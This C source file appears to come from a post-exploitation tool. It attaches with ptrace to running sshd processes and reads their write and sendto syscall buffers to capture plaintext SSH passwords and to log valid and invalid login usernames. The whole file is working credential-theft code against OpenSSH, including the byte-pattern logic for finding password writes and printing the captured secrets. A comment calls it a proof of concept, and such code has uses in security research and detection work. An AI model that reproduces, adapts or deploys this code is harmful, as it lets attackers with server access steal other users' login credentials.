#include <sys/ptrace.h>
#include <bits/types.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <assert.h>
#include <string.h>
#include <arpa/inet.h>

#define FILE_SSH_TRACER 1
#include "config.h"
#include "helpers.h"
#include "ssh_tracer.h"
#include "tracers.h"
#define SYSCALL_sendto 44

extern pid_t process_pid;
extern char *process_name;
extern char *process_path;
extern char *process_username;

void intercept_ssh_auth(pid_t traced_process);
void intercept_ssh_session(pid_t traced_process);

/*
 * finds ssh password candidates in memory
 * The write system call that transfers the
 * credential strings (among other strings)
 * begins with a length checksum at index 4 or 8
 * into the string
 *
 * write("\x00\x00\x00\x00\x08password\x00")
 *
 * Search all write system calls for a checksum with a
 * valid length string after and log them
 *
 */
char *find_password_write(char *memory, unsigned long len) {
  char *retval = NULL;
  char *strval = NULL;
  char *memory_copy = NULL;
  unsigned int checksum = 0;
  size_t slen = 0;

  //Checked earlier, but just in case someone else uses this function later
  if (len > MAX_PASSWORD_LEN)
    len = MAX_PASSWORD_LEN;

  memory_copy = (char *) calloc(sizeof(char) * len + 1, 1);

  if (!memory_copy)
    goto failed_find_password;

  // Different branch so it isn't compiled if the compile time
  // configuration option SHORT_SSH_STRINGS isn't set we aren't wasting
  // time. SHORT_SSH_STRINGS is off by default
  if (SHORT_SSH_STRINGS && len <= 8 && len > 4) {
    memset(memory_copy, 0, len);
    memcpy(memory_copy, memory, len);

    strval = &memory_copy[4];
    slen = strlen(strval);

    // Bytes to read checksum in the sshd write syscall
    checksum = ((unsigned int *) memory_copy)[0];
    checksum = ((checksum >> 24) & 0x000000ff)
             | ((checksum >> 8)  & 0x0000ff00)
             | ((checksum << 8)  & 0x00ff0000)
             | ((checksum << 24) & 0xff000000);

    if (slen == checksum) {
      retval = (char *) calloc(sizeof(char) * len + 1, 1);

      if (!retval)
        goto failed_find_password;

      memcpy(retval, strval, slen);
      free(memory_copy);
      return retval;
    }
  }

  if (len > 8) {
    memset(memory_copy, 0, len);
    memcpy(memory_copy, memory, len);

    strval = &memory_copy[4];
    slen = strlen(strval);

    // Bytes to read checksum in the sshd write syscall
    checksum = ((unsigned int *) memory_copy)[0];
    checksum = ((checksum >> 24) & 0x000000ff)
             | ((checksum >> 8)  & 0x0000ff00)
             | ((checksum << 8)  & 0x00ff0000)
             | ((checksum << 24) & 0xff000000);

    if (slen == checksum) {
      retval = (char *) calloc(sizeof(char) * len + 1, 1);

      if (!retval)
        goto failed_find_password;

      memcpy(retval, strval, slen);
      free(memory_copy);
      return retval;
    }

    strval = &memory_copy[8];
    slen = strlen(strval);

    // Bytes to read checksum in the sshd write syscall
    checksum = ((unsigned int *) memory_copy)[1];
    checksum = ((checksum >> 24) & 0x000000ff)
             | ((checksum >> 8)  & 0x0000ff00)
             | ((checksum << 8)  & 0x00ff0000)
             | ((checksum << 24) & 0xff000000);

    if (slen == checksum) {
      retval = (char *) calloc(sizeof(char) * len + 1, 1);

      if (!retval)
        goto failed_find_password;

      memcpy(retval, strval, slen);
      free(memory_copy);
      return retval;
    }

  }

failed_find_password:
  free(memory_copy);
  return NULL;
}

/* This tracer is mostly a proof of concept.
 * This can easily be done with a command like
 * `strace -p ${sshd_pid} -f 2>&1 | grep write`
 * Although, strace isn't on a lot of servers by
 * default. Other tracers like sudo, su, and ssh
 * client are slightly better usecases for this tool
 */
void intercept_ssh(pid_t traced_process) {
    int status = 0;
    int syscall = 0;
    long length = 0;
    long buf_addr = 0;
    long fd = 0;
    char *buf = NULL;
    int saw_password_preamble = 0;

    sleep(1);
    if (ptrace(PTRACE_ATTACH, traced_process, NULL, NULL) == -1) {
        perror("PTRACE_ATTACH failed");
        return;
    }

    waitpid(traced_process, &status, 0);
    if (!WIFSTOPPED(status)) return;

    ptrace(PTRACE_SETOPTIONS, traced_process, 0, PTRACE_O_TRACESYSGOOD);

    while (1) {
        if (wait_for_syscall(traced_process) != 0)
            break;

        syscall = get_syscall(traced_process);

        if (wait_for_syscall(traced_process) != 0)
            break;

        if (syscall == SYSCALL_write) {
            fd = get_syscall_arg(traced_process, 0);
            buf_addr = get_syscall_arg(traced_process, 1);
            length = get_syscall_arg(traced_process, 2);

            if (fd != 3 || length < 5 || length > MAX_PASSWORD_LEN)
                continue;

            buf = read_memory(traced_process, buf_addr, length);
            if (!buf) continue;

            // Check for the pattern "\0\0\0\xN\f"
            if (length == 5 && buf[4] == '\f') {
                saw_password_preamble = 1;
                free(buf);
                continue;
            }

            // Look for password candidate
            if (saw_password_preamble) {
                unsigned int pw_len = ntohl(*(unsigned int *)buf);
                if (pw_len > 0 && pw_len <= length - 4 && pw_len < MAX_PASSWORD_LEN) {
                    char password[256] = {0};
                    memcpy(password, buf + 4, pw_len);

                    if (strnascii(password, pw_len)) {
                        password[pw_len] = '\0';
                        //fprintf(stderr, "[DEBUG] Password candidate: %s\n", password);
                        debug("[DEBUG] Captured SSH password candidate: %s\n", password);
                        printf("[+] SSH password captured: '%s'\n", password);
                        //output("%s\n", password);
                    }
                }
                saw_password_preamble = 0; // Reset
            }

            free(buf);
        }
    }

    free_process_name();
    free_process_username();
    free_process_path();
    ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
    exit(0);
}


void intercept_ssh_auth(pid_t traced_process) {
    intercept_ssh(traced_process);
}



static int extract_username(char *pos, char *username, size_t max_len) {
  int i = 0;
  while (pos[i] && pos[i] != ' ' && pos[i] != '\n' && i < (int)(max_len - 1)) {
    username[i] = pos[i];
    i++;
  }
  username[i] = '\0';
  return i > 0;
}

void intercept_ssh_session(pid_t traced_process) {
  int status;
  long buf_addr = 0;
  long length = 0;
  //long fd = 0;
  char *buf = NULL;

  static int username_logged_invalid_json = 0;
  static int username_logged_valid_accepted = 0;
  static int username_logged_valid_failed = 0;
  static int username_logged_invalid_user = 0;

  sleep(1);
  if (ptrace(PTRACE_ATTACH, traced_process, NULL, NULL) == -1) {
    perror("PTRACE_ATTACH failed (session)");
    return;
  }

  waitpid(traced_process, &status, 0);
  if (!WIFSTOPPED(status)) return;

  ptrace(PTRACE_SETOPTIONS, traced_process, 0, PTRACE_O_TRACESYSGOOD);

  while (1) {
    if (wait_for_syscall(traced_process) != 0)
      break;

    int syscall = get_syscall(traced_process);
    if (wait_for_syscall(traced_process) != 0)
      break;

    if (syscall == SYSCALL_sendto) {
      //fd = get_syscall_arg(traced_process, 0);
      buf_addr = get_syscall_arg(traced_process, 1);
      length = get_syscall_arg(traced_process, 2);

      if (length < 16 || length > 512) {
        continue;
      }

      buf = read_memory(traced_process, buf_addr, length);

      //DEBUGGING DAEMON NOT CAPTURING USERNAMES
      if (buf) {
        debug("[DEBUG] Raw sendto buffer (%ld bytes):\n%.*s\n", length, (int)length, buf);
      }

      if (!buf) continue;

      // 1) userName JSON capture (invalid user or special cases)
      if (!username_logged_invalid_json && !username_logged_valid_accepted) {
        char *json_pos = strstr(buf, "\"userName\":\"");
        if (json_pos != NULL) {
          char *start = json_pos + strlen("\"userName\":\"");
          char *end = strchr(start, '"');
          if (end && end > start && (end - start) < 128) {
            char username[128] = {0};
            memcpy(username, start, end - start);
            username[end - start] = '\0';

            //fprintf(stderr, "[DEBUG] Captured SSH username (invalid JSON): %s\n", username);
            debug("[DEBUG] Captured invalid SSH username: %s\n", username);
            printf("[+] Captured invalid SSH username: '%s'\n", username);
            //output("%s\n", username);

            username_logged_invalid_json = 1;
          }
        }
      }

      // 2) Accepted password/publickey (valid successful login)
      if (!username_logged_valid_accepted) {
        const char *accepted_password = "Accepted password for ";
        const char *accepted_publickey = "Accepted publickey for ";

        char *pos = strstr(buf, accepted_password);
        int accepted_type = 0; // 1=password, 2=publickey
        if (pos) accepted_type = 1;
        else {
          pos = strstr(buf, accepted_publickey);
          if (pos) accepted_type = 2;
        }

        if (pos) {
          pos += (accepted_type == 1) ? strlen(accepted_password) : strlen(accepted_publickey);

          char username[128] = {0};
          if (extract_username(pos, username, sizeof(username))) {
            //fprintf(stderr, "[DEBUG] Captured SSH username (valid accepted): %s\n", username);
            debug("[DEBUG] Captured valid SSH username (good password): %s\n", username );
            printf("[+] Captured valid SSH username (good password): '%s'\n", username);
            //output("%s\n", username);

            username_logged_valid_accepted = 1;
          }
        }
      }

      // 3) Failed password (valid username with bad password)
      if (!username_logged_valid_failed) {
        const char *failed_password = "Failed password for ";

        char *pos = strstr(buf, failed_password);
        if (pos) {
          pos += strlen(failed_password);

          if (strncmp(pos, "invalid user ", strlen("invalid user ")) != 0) {
            char username[128] = {0};
            if (extract_username(pos, username, sizeof(username))) {
              //fprintf(stderr, "[DEBUG] Captured SSH username (valid failed): %s\n", username);
              debug("[DEBUG] Captured valid SSH username (bad password): %s\n", username);
              printf("[+] Captured valid SSH username (bad password): '%s'\n", username);
              //output("%s\n", username);

              username_logged_valid_failed = 1;
            }
          }
        }
      }

      // 4) Invalid user (bad username attempt)
      if (!username_logged_invalid_user) {
        const char *invalid_user = "Invalid user ";

        char *pos = strstr(buf, invalid_user);
        if (pos) {
          pos += strlen(invalid_user);

          char username[128] = {0};
          if (extract_username(pos, username, sizeof(username))) {
            //fprintf(stderr, "[DEBUG] Captured SSH username (invalid user): %s\n", username);
            debug("[DEBUG] Captured invalid SSH username: %s\n", username);
            printf("[+] Captured invalid SSH user username: '%s'\n", username);
            //output("%s\n", username);

            username_logged_invalid_user = 1;
          }
        }
      }

      free(buf);
      buf = NULL;
    }
  }

  free_process_name();
  free_process_username();
  free_process_path();
  ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
  exit(0);
}

//assert(errno == 0);

      //OPTIMIZATION NOTE: This check speeds things up, feel free to remove the if here
      //change MAX_PASSWORD_LEN in the config.h file to read larger passwords
//      if (length <= 0 || length > MAX_PASSWORD_LEN)
//        continue;

//      write_string = extract_write_string(traced_process, length);
//      password = find_password_write(write_string, length);

//      if (password && strnascii(password, length))
//        output("%s\n", password);

//     free(write_string);
//      free(password);
//      password = NULL;
//      write_string = NULL;
//    }
//  }

//exit_ssh:
//  free_process_name();
//  free_process_username();
//  free_process_path();
//  ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
//  exit(0);
//}
